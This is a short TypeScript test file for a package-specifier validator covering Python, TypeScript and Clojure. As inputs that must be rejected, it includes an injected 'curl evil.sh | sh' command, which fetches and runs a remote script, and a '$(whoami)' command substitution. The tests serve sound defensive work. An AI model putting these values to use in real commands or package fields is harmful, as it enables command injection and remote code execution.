import assert from 'node:assert';
import { validatePackages } from './validate-packages.ts';

assert.doesNotThrow(() => validatePackages('python', ['numpy', 'numpy==1.26.0']));
assert.throws(() => validatePackages('python', ['numpy>=1.0']));

assert.doesNotThrow(() => validatePackages('typescript', ['lodash', '@scope/pkg@^1.2.3']));
assert.doesNotThrow(() => validatePackages('clojure', ['org.clojure/data.json@2.5.0']));

for (const language of ['python', 'typescript', 'clojure'] as const) {
	assert.throws(() => validatePackages(language, ['x; curl evil.sh | sh']));
	assert.throws(() => validatePackages(language, ['$(whoami)']));
}

console.log('ok');
